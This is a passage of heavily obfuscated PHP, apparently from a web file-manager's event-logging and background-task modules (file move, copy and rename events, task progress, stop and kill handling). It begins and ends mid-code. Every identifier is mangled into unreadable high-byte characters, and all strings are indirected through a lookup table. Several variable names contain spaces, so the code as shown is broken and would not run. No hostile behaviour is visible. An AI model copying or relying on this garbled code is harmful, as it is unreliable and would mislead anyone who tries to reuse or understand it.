array_field_key($ƒ’†«”É, array($—ªô—şŸ[203], $—ªô—şŸ[550], $—ªô—şŸ[514], $—ªô—şŸ[593])); $àñÆË‘Á = array($—ªô—şŸ[181] => $ƒ’†«”É[$—ªô—şŸ[32]], $—ªô—şŸ[2216] => ACTION, $—ªô—şŸ[2218] => $ĞÉñ˜ºŒ); return $this->addEvent($ƒ’†«”É[$—ªô—şŸ[202]], $—ªô—şŸ[1946], $àñÆË‘Á); } public function eventShare($Œ’¿ŒŠš, $øàïÃÚã) { return $this->addEvent($Œ’¿ŒŠš, $_SERVER[÷ôÚîå][1957], $øàïÃÚã); } public function eventMove($õâÓôÊ™, $©«¸Ú, $‚‘ï „) { $£¥ïÊı¯ =& $_SERVER[÷ôÚîå]; if (self::$_removeLast == $õâÓôÊ™) { return; } $Ë«Çšß­ = Model($£¥ïÊı¯[1429]); $ÓÌ“¤Û = $Ë«Çšß­->sourceInfo($õâÓôÊ™); $ø÷ªÃñÛ = $Ë«Çšß­->sourceInfo($©«¸Ú); $ÃÇ¤©Û´ = $Ë«Çšß­->sourceInfo($‚‘ï „); $âÇ­ìåÇ = array($£¥ïÊı¯[1252] => $©«¸Ú, $£¥ïÊı¯[2219] => $ø÷ªÃñÛ[$£¥ïÊı¯[32]], $£¥ïÊı¯[2195] => !empty($ø÷ªÃñÛ[$£¥ïÊı¯[591]]) ? $ø÷ªÃñÛ[$£¥ïÊı¯[591]] : $£¥ïÊı¯[12], $£¥ïÊı¯[1253] => $‚‘ï „, $£¥ïÊı¯[2220] => $ÃÇ¤©Û´[$£¥ïÊı¯[32]], $£¥ïÊı¯[2221] => !empty($ÃÇ¤©Û´[$£¥ïÊı¯[591]]) ? $ÃÇ¤©Û´[$£¥ïÊı¯[591]] : $£¥ïÊı¯[12]); $this->addEvent($õâÓôÊ™, $£¥ïÊı¯[629], $âÇ­ìåÇ); $ÓÌ“¤Û = $Ë«Çšß­->sourceInfo($õâÓôÊ™); $âÇ­ìåÇ = array($£¥ïÊı¯[203] => $ÓÌ“¤Û[$£¥ïÊı¯[203]], $£¥ïÊı¯[32] => $ÓÌ“¤Û[$£¥ïÊı¯[32]]); $this->addEvent($©«¸Ú, $£¥ïÊı¯[2222], $âÇ­ìåÇ); } public function eventCopy($ÓÁÀ´´é) { $this->eventCreate($ÓÁÀ´´é, $_SERVER[÷ôÚîå][627]); } public function eventRename($ÒÚÌßÏ¹, $ª±¬½à–, $¯æ¹³âè) { $µ®ƒ¡—Ÿ =& $_SERVER[÷ôÚîå]; $ó¦´¾ñ° = array($µ®ƒ¡—Ÿ[1252] => $ª±¬½à–, $µ®ƒ¡—Ÿ[1253] => $¯æ¹³âè); return $this->addEvent($ÒÚÌßÏ¹, $µ®ƒ¡—Ÿ[1443], $ó¦´¾ñ°); } public function eventAddComment($µÊ¹ÃŒÊ, $ßÃíÄ…à) { return $this->addEvent($µÊ¹ÃŒÊ, $_SERVER[÷ôÚîå][2223], $ßÃíÄ…à); } public function eventAddDesc($ø¨ßŸÆ, $à±¸×‡•) { return $this->addEvent($ø¨ßŸÆ, $_SERVER[÷ôÚîå][2224], $à±¸×‡•); } public function listBySource($·ïÌ›ÙŸ) { $•òÛüÜ =& $_SERVER[÷ôÚîå]; $à¸‰º›æ = Model($•òÛüÜ[1429])->sourceInfo($·ïÌ›ÙŸ); $İ–‡»Ïî = array($•òÛüÜ[500] => $·ïÌ›ÙŸ); if ($à¸‰º›æ[$•òÛüÜ[494]] == $•òÛüÜ[101]) { $ê÷±±÷¥ = Model($•òÛüÜ[1429])->listSearchChildren($·ïÌ›ÙŸ, 20000); $ê÷±±÷¥[] = $·ïÌ›ÙŸ . $•òÛüÜ[463]; $İ–‡»Ïî = array($•òÛüÜ[203] => array($•òÛüÜ[7], $ê÷±±÷¥)); } $¶øÜ›Š¯ = $this->where($İ–‡»Ïî)->order($•òÛüÜ[2225])->selectPage(); if ($¶øÜ›Š¯[$•òÛüÜ[451]][$•òÛüÜ[452]] == 0) { $¶øÜ›Š¯[$•òÛüÜ[451]][$•òÛüÜ[452]] = 1; $¶øÜ›Š¯[$•òÛüÜ[454]] = array(array($•òÛüÜ[500] => $·ïÌ›ÙŸ, $•òÛüÜ[2205] => $à¸‰º›æ[$•òÛüÜ[202]], $•òÛüÜ[1770] => $à¸‰º›æ[$•òÛüÜ[536]], $•òÛüÜ[505] => $•òÛüÜ[2226], $•òÛüÜ[506] => $à¸‰º›æ[$•òÛüÜ[241]], $•òÛüÜ[1772] => $•òÛüÜ[12])); } return $this->eventListParse($¶øÜ›Š¯, $·ïÌ›ÙŸ); } private function eventListParse($ÎĞ¸Ÿ“â, $È«ĞÀÖë) { $™–¯¤Ø« =& $_SERVER[÷ôÚîå]; $ïÚøÏèÏ = $ÎĞ¸Ÿ“â[$™–¯¤Ø«[454]]; $½µò˜— = array_to_keyvalue($ïÚøÏèÏ, $™–¯¤Ø«[12], $™–¯¤Ø«[203]); $İëïò¹¨ = array_to_keyvalue($ïÚøÏèÏ, $™–¯¤Ø«[12], $™–¯¤Ø«[2211]); foreach ($ïÚøÏèÏ as $Š¦ä†Œ) { $«¤¤æÄÀ = $Š¦ä†Œ[$™–¯¤Ø«[535]]; if ($Š¦ä†Œ[$™–¯¤Ø«[33]] == $™–¯¤Ø«[629] && isset($«¤¤æÄÀ[$™–¯¤Ø«[1252]])) { $½µò˜—[] = $«¤¤æÄÀ[$™–¯¤Ø«[1252]] . $™–¯¤Ø«[12]; $½µò˜—[] = $«¤¤æÄÀ[$™–¯¤Ø«[1253]] . $™–¯¤Ø«[12]; } if ($Š¦ä†Œ[$™–¯¤Ø«[33]] == $™–¯¤Ø«[2222] && isset($«¤¤æÄÀ[$™–¯¤Ø«[203]])) { $½µò˜—[] = $«¤¤æÄÀ[$™–¯¤Ø«[203]] . $™–¯¤Ø«[12]; } } $½µò˜— = array_merge($½µò˜—, $İëïò¹¨, array($È«ĞÀÖë . $™–¯¤Ø«[12])); $½µò˜— = array_unique($½µò˜—); $©¦Àªıµ = array_unique(array_to_keyvalue($ïÚøÏèÏ, $™–¯¤Ø«[12], $™–¯¤Ø«[1779])); $¢¹‹ÎæÜ = Model($™–¯¤Ø«[607])->userListInfo($©¦Àªıµ); $¶»ì‚¢• = Model($™–¯¤Ø«[914])->sourceListInfo($½µò˜—, !0); foreach ($ïÚøÏèÏ as &$Š¦ä†Œ) { if ($Š¦ä†Œ[$™–¯¤Ø«[33]] == $™–¯¤Ø«[629] && isset($Š¦ä†Œ[$™–¯¤Ø«[535]][$™–¯¤Ø«[1252]])) { $Š¦ä†Œ[$™–¯¤Ø«[535]][$™–¯¤Ø«[1252]] = $¶»ì‚¢•[$Š¦ä†Œ[$™–¯¤Ø«[535]][$™–¯¤Ø«[1252]]]; $Š¦ä†Œ[$™–¯¤Ø«[535]][$™–¯¤Ø«[1253]] = $¶»ì‚¢•[$Š¦ä†Œ[$™–¯¤Ø«[535]][$™–¯¤Ø«[1253]]]; } if ($Š¦ä†Œ[$™–¯¤Ø«[33]] == $™–¯¤Ø«[2222] && isset($Š¦ä†Œ[$™–¯¤Ø«[535]][$™–¯¤Ø«[203]])) { $Š¦ä†Œ[$™–¯¤Ø«[535]][$™–¯¤Ø«[203]] = $¶»ì‚¢•[$Š¦ä†Œ[$™–¯¤Ø«[535]][$™–¯¤Ø«[203]]]; } $Š¦ä†Œ[$™–¯¤Ø«[100]] = $¶»ì‚¢•[$Š¦ä†Œ[$™–¯¤Ø«[203]]]; $Š¦ä†Œ[$™–¯¤Ø«[2227]] = $¶»ì‚¢•[$Š¦ä†Œ[$™–¯¤Ø«[2211]]]; if ($Š¦ä†Œ[$™–¯¤Ø«[33]] == $™–¯¤Ø«[1946]) { $Š¦ä†Œ[$™–¯¤Ø«[2227]] = $Š¦ä†Œ[$™–¯¤Ø«[100]]; $Š¦ä†Œ[$™–¯¤Ø«[2211]] = $Š¦ä†Œ[$™–¯¤Ø«[2227]][$™–¯¤Ø«[203]]; $Š¦ä†Œ[$™–¯¤Ø«[100]] = !1; $Š¦ä†Œ[$™–¯¤Ø«[203]] = $™–¯¤Ø«[12]; } $Š¦ä†Œ[$™–¯¤Ø«[2154]] = $¢¹‹ÎæÜ[$Š¦ä†Œ[$™–¯¤Ø«[1779]]]; } unset($Š¦ä†Œ); $ÎĞ¸Ÿ“â[$™–¯¤Ø«[454]] = $ïÚøÏèÏ; return $ÎĞ¸Ÿ“â; } public function removeBySource($å¬’¨·÷) { $¯¿‡¨ƒó = array($_SERVER[÷ôÚîå][500] => $å¬’¨·÷); $this->where($¯¿‡¨ƒó)->remove(); } } goto E±èÇ·•‰; bå‡šì·âœ: class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\x72\165\x6e\x6e\x69\x6e\x67"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($úò…¶Éô, $´‰êÈ”ê = '', $ıáèâÁ» = 0, $÷…à±¢Õ = '') { $Í¥î÷ÛÇ =& $_SERVER[÷ôÚîå]; if (self::get($úò…¶Éô)) { return; } $this->task = array($Í¥î÷ÛÇ[484] => $úò…¶Éô, $Í¥î÷ÛÇ[1779] => USER_ID, $Í¥î÷ÛÇ[1668] => $÷…à±¢Õ, $Í¥î÷ÛÇ[535] => $Í¥î÷ÛÇ[12], $Í¥î÷ÛÇ[33] => $´‰êÈ”ê, $Í¥î÷ÛÇ[1154] => $Í¥î÷ÛÇ[12], $Í¥î÷ÛÇ[1152] => $ıáèâÁ», $Í¥î÷ÛÇ[1780] => 0, $Í¥î÷ÛÇ[1781] => 0, $Í¥î÷ÛÇ[1782] => 0, $Í¥î÷ÛÇ[1783] => timeFloat(), $Í¥î÷ÛÇ[1784] => 0, $Í¥î÷ÛÇ[1785] => 0, $Í¥î÷ÛÇ[1786] => 0, $Í¥î÷ÛÇ[1787] => 0, $Í¥î÷ÛÇ[839] => $Í¥î÷ÛÇ[1729]); $GLOBALS[$Í¥î÷ÛÇ[1788]] = 1; Hook::bind($Í¥î÷ÛÇ[1733], array($this, $Í¥î÷ÛÇ[1789])); Hook::bind($Í¥î÷ÛÇ[1790], array($this, $Í¥î÷ÛÇ[1791])); $this->startAfter(); Hook::trigger($Í¥î÷ÛÇ[1792], $this->task); $this->task[$Í¥î÷ÛÇ[1785]] = timeFloat(); } public function end($ØƒÔşÚ€ = '') { $µ†şŸñù =& $_SERVER[÷ôÚîå]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$µ†şŸñù[1785]]) { self::valueSet($this->task[$µ†şŸñù[484]], !1); } $this->isEnd = !0; if ($ØƒÔşÚ€) { $this->task[$µ†şŸñù[535]] = $ØƒÔşÚ€; } self::log($µ†şŸñù[1793] . $this->task[$µ†şŸñù[484]] . $µ†şŸñù[1794] . sprintf($µ†şŸñù[940], timeFloat() - $this->task[$µ†şŸñù[1783]]) . $µ†şŸñù[1795]); Hook::unbind($µ†şŸñù[1733], array($this, $µ†şŸñù[1789])); Hook::unbind($µ†şŸñù[1790], array($this, $µ†şŸñù[1791])); $this->endAfter(); $ü¯›óş = $this->task; $this->task = !1; Hook::trigger($µ†şŸñù[1796], $ü¯›óş); } public function update($Œşˆ›ûò = 0, $Â¾ë¨› = false) { $‹ÓÑÓÌõ =& $_SERVER[÷ôÚîå]; $ÀÆì‡¢ =& $this->task; if (!$ÀÆì‡¢) { return; } $ÀÆì‡¢[$‹ÓÑÓÌõ[1780]] += $Œşˆ›ûò; $ÀÆì‡¢[$‹ÓÑÓÌõ[1784]] = timeFloat(); if ($ÀÆì‡¢[$‹ÓÑÓÌõ[1152]]) { if ($ÀÆì‡¢[$‹ÓÑÓÌõ[1152]] < $ÀÆì‡¢[$‹ÓÑÓÌõ[1780]]) { $ÀÆì‡¢[$‹ÓÑÓÌõ[1152]] = $ÀÆì‡¢[$‹ÓÑÓÌõ[1780]]; } $¬›˜âÑ’ = timeFloat() - $ÀÆì‡¢[$‹ÓÑÓÌõ[1783]] - $ÀÆì‡¢[$‹ÓÑÓÌõ[1786]]; if ($¬›˜âÑ’ <= 0) { $¬›˜âÑ’ = 0.001; } $ÀÆì‡¢[$‹ÓÑÓÌõ[1781]] = $ÀÆì‡¢[$‹ÓÑÓÌõ[1780]] / $ÀÆì‡¢[$‹ÓÑÓÌõ[1152]]; $ÀÆì‡¢[$‹ÓÑÓÌõ[1782]] = $ÀÆì‡¢[$‹ÓÑÓÌõ[1780]] / $¬›˜âÑ’; if ($ÀÆì‡¢[$‹ÓÑÓÌõ[1781]] > 0) { $ÀÆì‡¢[$‹ÓÑÓÌõ[1787]] = $¬›˜âÑ’ * (1 - $ÀÆì‡¢[$‹ÓÑÓÌõ[1781]]) / $ÀÆì‡¢[$‹ÓÑÓÌõ[1781]]; } $ÀÆì‡¢[$‹ÓÑÓÌõ[1787]] = $ÀÆì‡¢[$‹ÓÑÓÌõ[1787]] <= 0 ? 0 : $ÀÆì‡¢[$‹ÓÑÓÌõ[1787]]; } $this->updateAfter(); $Ù–±¹ = 0.2; if (timeFloat() - $ÀÆì‡¢[$‹ÓÑÓÌõ[1785]] < $Ù–±¹ && !$Â¾ë¨›) { return; } $¡Ë¤ÙÛ¡ = self::get($ÀÆì‡¢[$‹ÓÑÓÌõ[484]]); $Õ¤íäØæ = $¡Ë¤ÙÛ¡[$‹ÓÑÓÌõ[839]]; if ($Õ¤íäØæ == self::STATYS_KILL) { $Îòøı Ğ = array($‹ÓÑÓÌõ[1797] => LNG($‹ÓÑÓÌõ[1798]), $‹ÓÑÓÌõ[1308] => !1); Cache::set($‹ÓÑÓÌõ[1799] . $this->task[$‹ÓÑÓÌõ[484]], $Îòøı Ğ, 30); $this->onKill(); $this->end(); die; } else { if ($Õ¤íäØæ == self::STATYS_STOP) { $œËšÁ·« = 2; $¡Ë¤ÙÛ¡[$‹ÓÑÓÌõ[1786]] += $œËšÁ·«; self::valueSet($ÀÆì‡¢[$‹ÓÑÓÌõ[484]], $¡Ë¤ÙÛ¡); sleep($œËšÁ·«); $this->update(); return; } } $ÀÆì‡¢[$‹ÓÑÓÌõ[839]] = $Õ¤íäØæ ? $Õ¤íäØæ : $ÀÆì‡¢[$‹ÓÑÓÌõ[839]]; $ÀÆì‡¢[$‹ÓÑÓÌõ[1786]] = $¡Ë¤ÙÛ¡[$‹ÓÑÓÌõ[1786]] ? $¡Ë¤ÙÛ¡[$‹ÓÑÓÌõ[1786]] : 0; $ÀÆì‡¢[$‹ÓÑÓÌõ[1785]] = timeFloat(); Hook::trigger($‹ÓÑÓÌõ[1800], $ÀÆì‡¢); self::valueSet($ÀÆì‡¢[$‹ÓÑÓÌõ[484]], $ÀÆì‡¢); } public function onKillSet($Æí’óœ¬, $íš¬ò¤Ä = array()) { $this->onKillCall = array($Æí’óœ¬, $íš¬ò¤Ä); } public function onKill() { $ş÷ˆ› =& $_SERVER[÷ôÚîå]; self::log($ş÷ˆ›[1793] . $this->task[$ş÷ˆ›[484]] . $ş÷ˆ›[1801]); Hook::trigger($ş÷ˆ›[1802], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($à¤É¨Õ”) { $œ•¢‚Ÿ– =& $_SERVER[÷ôÚîå]; Cache::set($œ•¢‚Ÿ–[1799] . $this->task[$œ•¢‚Ÿ–[484]], $à¤É¨Õ”, 60); return $à¤É¨Õ”; } public static function get($ØŠÂûŒ¬) { $åƒıÂÚç =& $_SERVER[÷ôÚîå]; $ûòÊ›á¨ = self::valueGet($ØŠÂûŒ¬); if (is_array($ûòÊ›á¨) && $ûòÊ›á¨[$åƒıÂÚç[1803]]) { $°ÜŸ§ôÍ = ActionApply($ûòÊ›á¨[$åƒıÂÚç[1803]], array($ûòÊ›á¨)); $ûòÊ›á¨ = is_array($°ÜŸ§ôÍ) ? $°ÜŸ§ôÍ : $ûòÊ›á¨; } return $ûòÊ›á¨; } public static function listData() { $†€£™× = self::valueGet(); return array_sort_by($†€£™×, $_SERVER[÷ôÚîå][1783], !0); } public static function kill($èÈÊ¶àÄ) { return self::changeStatus($èÈÊ¶àÄ, self::STATYS_KILL); } public static function stop($öö“ïôŸ) { return self::changeStatus($öö“ïôŸ, self::STATYS_STOP); } public static function restart($Íµ¬¿) { return self::changeStatus($Íµ¬¿, self::STATYS_RUNNING); } public static function killAll() { $éÍÜ“¦Ï =& $_SERVER[÷ôÚîå]; $éçƒ“§ = self::listData(); foreach ($éçƒ“§ as $ÕË¹Á¬ë) { self::kill($ÕË¹Á¬ë[$éÍÜ“¦Ï[484]]); } sleep(2); foreach ($éçƒ“§ as $ÕË¹Á¬ë) { self::valueSet($ÕË¹Á¬ë[$éÍÜ“¦Ï[484]], !1); } } private static function changeStatus($¨€¨ûÙ¡, $ûÉÍú…œ) { $Èá“ÈÄ½ =& $_SERVER[÷ôÚîå]; $¼¢¬“ü— = self::valueGet($¨€¨ûÙ¡); if (!$¼¢¬“ü—) { return !1; } $¼¢¬“ü—[$Èá“ÈÄ½[839]] = $ûÉÍú…œ; self::valueSet($¨€¨ûÙ¡, $¼¢¬“ü—); self::log($Èá“ÈÄ½[1804] . $¼¢¬“ü—[$Èá“ÈÄ½[484]] . $Èá“ÈÄ½[1805] . $ûÉÍú…œ); return !0; } public static function valueGet($ øÕÑ¿Ü = false) { $ü‹ˆÆ¸ =& $_SERVER[÷ôÚîå]; if ($ øÕÑ¿Ü) { $¾—ïŒ÷ = Model($ü‹ˆÆ¸[529])->where(array($ü‹ˆÆ¸[107] => $ øÕÑ¿Ü, $ü‹ˆÆ¸[33] => $ü‹ˆÆ¸[1161]))->find(); return $¾—ïŒ÷ ? json_decode($¾—ïŒ÷[$ü‹ˆÆ¸[459]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($«ÁÚ’ÅŠ = false) { $ıŒ¿Êì¥ =& $_SERVER[÷ôÚîå]; $åÓëş°ú = array($ıŒ¿Êì¥[33] => $ıŒ¿Êì¥[1161]); if ($«ÁÚ’ÅŠ) { $åÓëş°ú[$ıŒ¿Êì¥[1779]] = $«ÁÚ’ÅŠ; } $Û–…ƒ¿ = Model($ıŒ¿Êì¥[529])->where($åÓëş°ú)->select(); $Û–…ƒ¿ = $Û–…ƒ¿ ? $Û–…ƒ¿ : array(); foreach ($Û–…ƒ¿ as $øíú”äÕ => $„Ü„ÆÄê) { $Û–…ƒ¿[$øíú”äÕ] = json_decode($„Ü„ÆÄê[$ıŒ¿Êì¥[459]], !0); } return $Û–…ƒ¿; } public static function valueSet($ñâÖ±âê, $¯—ú÷ªş) { $…í›ÆÈõ =& $_SERVER[÷ôÚîå]; if (!$¯—ú÷ªş) { return Model($…í›ÆÈõ[529])->where(array($…í›ÆÈõ[107] => $ñâÖ±âê, $…í›ÆÈõ[33] => $…í›ÆÈõ[1161]))->delete(); } $Íƒçæ = json_encode($¯—ú÷ªş); if (!$Íƒçæ) { ob_start(); var_dump($¯—ú÷ªş); $·’ó­•Š = ob_get_clean(); self::log($…í›ÆÈõ[1806] . json_encode_force($·’ó­•Š)); } if (!$ñâÖ±âê || !$¯—ú÷ªş[$…í›ÆÈõ[484]]) { return !1; } $¯²ğÛö§ = array($…í›ÆÈõ[33] => $…í›ÆÈõ[1161], $…í›ÆÈõ[1779] => USER_ID, $…í›ÆÈõ[107] => $ñâÖ±âê, $…í›ÆÈõ[459] => $Íƒçæ); $ˆØ¢Ş” = $…í›ÆÈõ[1807]; CacheLock::lock($ˆØ¢Ş”); Model($…í›ÆÈõ[529])->add($¯²ğÛö§, array(), !0); CacheLock::unlock($ˆØ¢Ş”); } public static function log($øÌ²”Ä«) { if (!GLOBAL_DEBUG) { return; } write_log($øÌ²”Ä«, $_SERVER[÷ôÚîå][1808]); } } class TaskFileTransfer extends Task { protected function startAfter() { $¥ˆâ‚— =& $_SERVER[÷ôÚîå]; $øàÂ¶Ñ® =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¥ˆâ‚—[1809], array($this, $¥ˆâ‚—[1810])); Hook::bind($¥ˆâ‚—[1319], array($this, $¥ˆâ‚—[1811])); Hook::bind($¥ˆâ‚—[1812], array($this, $¥ˆâ‚—[1813])); Hook::bind($¥ˆâ‚—[677], array($this, $¥ˆâ‚—[1814])); Hook::bind($¥ˆâ‚—[678], array($this, $¥ˆâ‚—[1815])); Hook::bind($¥ˆâ‚—[684], array($this, $¥ˆâ‚—[1816])); Hook::bind($¥ˆâ‚—[685], array($this, $¥ˆâ‚—[1817])); Hook::bind($¥ˆâ‚—[680], array($this, $¥ˆâ‚—[1818])); Hook::bind($¥ˆâ‚—[682], array($this, $¥ˆâ‚—[1819])); Hook::bind($¥ˆâ‚—[646], array($this, $¥ˆâ‚—[1820])); Hook::bind($¥ˆâ‚—[643], array($this, $¥ˆâ‚—[1820])); Hook::bind($¥ˆâ‚—[648], array($this, $¥ˆâ‚—[1820])); Hook::bind($¥ˆâ‚—[650], array($this, $¥ˆâ‚—[1820])); Hook::bind($¥ˆâ‚—[652], array($this, $¥ˆâ‚—[1820])); Hook::bind($¥ˆâ‚—[1821], array($this, $¥ˆâ‚—[1822])); Hook::bind($¥ˆâ‚—[668], array($this, $¥ˆâ‚—[1823])); $this->sourceModelCopyFlag = !1; Hook::bind($¥ˆâ‚—[1824], array($this, $¥ˆâ‚—[1825])); Hook::bind($¥ˆâ‚—[1826], array($this, $¥ˆâ‚—[1827])); Hook::bind($¥ˆâ‚—[1828], array($this, $¥ˆâ‚—[1829])); $øàÂ¶Ñ®[$¥ˆâ‚—[1830]] = LNG($¥ˆâ‚—[1831]); $øàÂ¶Ñ®[$¥ˆâ‚—[1832]] = 0; $øàÂ¶Ñ®[$¥ˆâ‚—[1833]] = 0; $øàÂ¶Ñ®[$¥ˆâ‚—[1154]] = $¥ˆâ‚—[12]; $øàÂ¶Ñ®[$¥ˆâ‚—[1834]] = $¥ˆâ‚—[12]; $øàÂ¶Ñ®[$¥ˆâ‚—[1835]] = 0; $øàÂ¶Ñ®[$¥ˆâ‚—[1836]] = 0; $øàÂ¶Ñ®[$¥ˆâ‚—[1837]] = 0; if (!$øàÂ¶Ñ®[$¥ˆâ‚—[1668]]) { $øàÂ¶Ñ®[$¥ˆâ‚—[1668]] = LNG($¥ˆâ‚—[1838]); } } protected function endAfter() { $àÚ§£ë =& $_SERVER[÷ôÚîå]; Hook::unbind($àÚ§£ë[1809], array($this, $àÚ§£ë[1810])); Hook::unbind($àÚ§£ë[1319], array($this, $àÚ§£ë[1811])); Hook::unbind($àÚ§£ë[1812], array($this, $àÚ§£ë[1813])); Hook::unbind($àÚ§£ë[677], array($this, $àÚ§£ë[1814])); Hook::unbind($àÚ§£ë[678], array($this, $àÚ§£ë[1815])); Hook::unbind($àÚ§£ë[684], array($this, $àÚ§£ë[1816])); Hook::unbind($àÚ§£ë[685], array($this, $àÚ§£ë[1817])); Hook::unbind($àÚ§£ë[680], array($this, $àÚ§£ë[1818])); Hook::unbind($àÚ§£ë[682], array($this, $àÚ§£ë[1819])); Hook::unbind($àÚ§£ë[646], array($this, $àÚ§£ë[1820])); Hook::unbind($àÚ§£ë[643], array($this, $àÚ§£ë[1820])); Hook::unbind($àÚ§£ë[648], array($this, $àÚ§£ë[1820])); Hook::unbind($àÚ§£ë[650], array($this, $àÚ§£ë[1820])); Hook::unbind($àÚ§£ë[652], array($this, $àÚ§£ë[1820])); Hook::unbind($àÚ§£ë[1821], array($this, $àÚ§£ë[1822])); Hook::unbind($àÚ§£ë[668], array($this, $àÚ§£ë[1823])); Hook::unbind($àÚ§£ë[1824], array($this, $àÚ§£ë[1825])); Hook::unbind($àÚ§£ë[1826], array($this, $àÚ§£ë[1827])); Hook::unbind($àÚ§£ë[1828], array($this, $àÚ§£ë[1829])); } public function copyMoveStart($õÎ®°§Ú, $ï¼Ú÷ š, $â´Ü…„¾, $¸Ñ£Ù¨) { $»ÙÖ…«Ø =& $_SERVER[÷ôÚîå]; self::log($»ÙÖ…«Ø[1839] . $ï¼Ú÷ š . $»ÙÖ…«Ø[83] . $¸Ñ£Ù¨); $°Ë¯¢õô = rtrim(TEMP_FILES, $»ÙÖ…«Ø[8]); if (substr($ï¼Ú÷ š, 0, strlen($°Ë¯¢õô)) == $°Ë¯¢õô) { return; } if (substr($¸Ñ£Ù¨, 0, strlen($°Ë¯¢õô)) == $°Ë¯¢õô) { return; } $êÁòô‹ =& $this->task; $êÁòô‹[$»ÙÖ…«Ø[1840]] = KodIO::transferType($õÎ®°§Ú, $â´Ü…„¾); $this->update(); } public function updateAfter() { $£¾µÃí =& $_SERVER[÷ôÚîå]; $´™–™‰Š =& $this->task; if (!$´™–™‰Š[$£¾µÃí[852]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($´™–™‰Š[$£¾µÃí[1840]] == $£¾µÃí[1412]) { return; } self::updateTask($´™–™‰Š); } private static function updateTask(&$ñÂ˜î§Ú) { $¦´€½áµ =& $_SERVER[÷ôÚîå]; if ($ñÂ˜î§Ú[$¦´€½áµ[1840]] == $¦´€½áµ[1290] || $ñÂ˜î§Ú[$¦´€½áµ[1840]] == $¦´€½áµ[120]) { if ($ñÂ˜î§Ú[$¦´€½áµ[1834]]) { $ñÂ˜î§Ú[$¦´€½áµ[1837]] = $ñÂ˜î§Ú[$¦´€½áµ[1836]] + $ñÂ˜î§Ú[$¦´€½áµ[1833]]; } } else { if ($ñÂ˜î§Ú[$¦´€½áµ[1840]] == $¦´€½áµ[1413]) { if ($ñÂ˜î§Ú[$¦´€½áµ[1834]] == $¦´€½áµ[1290]) { $ñÂ˜î§Ú[$¦´€½áµ[1837]] = $ñÂ˜î§Ú[$¦´€½áµ[1836]] + $ñÂ˜î§Ú[$¦´€½áµ[1833]] * 0.5; } else { if ($ñÂ˜î§Ú[$¦´€½áµ[1834]] == $¦´€½áµ[120]) { $ñÂ˜î§Ú[$¦´€½áµ[1837]] = $ñÂ˜î§Ú[$¦´€½áµ[1836]] + $ñÂ˜î§Ú[$¦´€½áµ[1832]] * 0.5 + $ñÂ˜î§Ú[$¦´€½áµ[1833]] * 0.5; } } } } $ñÂ˜î§Ú[$¦´€½áµ[1781]] = $ñÂ˜î§Ú[$¦´€½áµ[1837]] / $ñÂ˜î§Ú[$¦´€½áµ[852]]; if ($ñÂ˜î§Ú[$¦´€½áµ[1781]] > 0) { $‰ ›Ïœ€ = timeFloat() - $ñÂ˜î§Ú[$¦´€½áµ[1783]] - $ñÂ˜î§Ú[$¦´€½áµ[1786]]; $ñÂ˜î§Ú[$¦´€½áµ[1787]] = $‰ ›Ïœ€ * (1 - $ñÂ˜î§Ú[$¦´€½áµ[1781]]) / $ñÂ˜î§Ú[$¦´€½áµ[1781]]; } } public function addPath($õº›²¡¸) { $Õ›ÎÄé =& $_SERVER[÷ôÚîå]; if (!$õº›²¡¸) { return; } $­—¯ŒÀø =& $this->task; $ö¯°ò¯ = IO::infoWithChildren($õº›²¡¸); $¹“¢ª·Õ = $­—¯ŒÀø[$Õ›ÎÄé[1841]] ? $­—¯ŒÀø[$Õ›ÎÄé[1841]][$Õ›ÎÄé[1842]] : 0; $­—¯ŒÀø[$Õ›ÎÄé[1841]] = array($Õ›ÎÄé[1842] => $¹“¢ª·Õ + 1, $Õ›ÎÄé[503] => $ö¯°ò¯[$Õ›ÎÄé[32]], $Õ›ÎÄé[97] => $ö¯°ò¯[$Õ›ÎÄé[97]], $Õ›ÎÄé[591] => $ö¯°ò¯[$Õ›ÎÄé[591]] ? $ö¯°ò¯[$Õ›ÎÄé[591]] : $ö¯°ò¯[$Õ›ÎÄé[97]]); if ($ö¯°ò¯[$Õ›ÎÄé[33]] == $Õ›ÎÄé[240]) { $­—¯ŒÀø[$Õ›ÎÄé[1152]] += 1; } else { $­—¯ŒÀø[$Õ›ÎÄé[1152]] += $ö¯°ò¯[$Õ›ÎÄé[92]][$Õ›ÎÄé[90]]; if ($ö¯°ò¯[$Õ›ÎÄé[203]]) { $­—¯ŒÀø[$Õ›ÎÄé[1152]] += $ö¯°ò¯[$Õ›ÎÄé[92]][$Õ›ÎÄé[91]] + 1; } } $­—¯ŒÀø[$Õ›ÎÄé[852]] += $ö¯°ò¯[$Õ›ÎÄé[89]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($²¯òŒÙÌ) { } public function sourceAddHashEnd($âäŸÛ¢ö) { } public function sourceAddFileStart($–ãæªé) { $Áàµúì½ =& $_SERVER[÷ôÚîå]; $“¬ÃÁÓ³ =& $this->task; $“¬ÃÁÓ³[$Áàµúì½[1832]] = $–ãæªé[$Áàµúì½[89]]; $“¬ÃÁÓ³[$Áàµúì½[1830]] = $–ãæªé[$Áàµúì½[32]]; $“¬ÃÁÓ³[$Áàµúì½[1154]] = $–ãæªé[$Áàµúì½[32]]; $“¬ÃÁÓ³[$Áàµúì½[1843]] = $–ãæªé[$Áàµúì½[97]]; $this->update(); } public function sourceAddFileEnd($òö¨–éÈ) { $™…ÔÛÛê =& $_SERVER[÷ôÚîå]; $õÄÉğŠ‘ =& $this->task; $õÄÉğŠ‘[$™…ÔÛÛê[1837]] += $òö¨–éÈ[$™…ÔÛÛê[89]]; $õÄÉğŠ‘[$™…ÔÛÛê[1843]] = $òö¨–éÈ[$™…ÔÛÛê[97]]; $this->update(1); } public function copyFileStart($Éª‘ºİò, $ì‚ÑÇƒö, $¯ÊëÇ¨ï, $Åò•¤Úà, $Šé¯ğ¬¢, $ğ„î Ğ) { 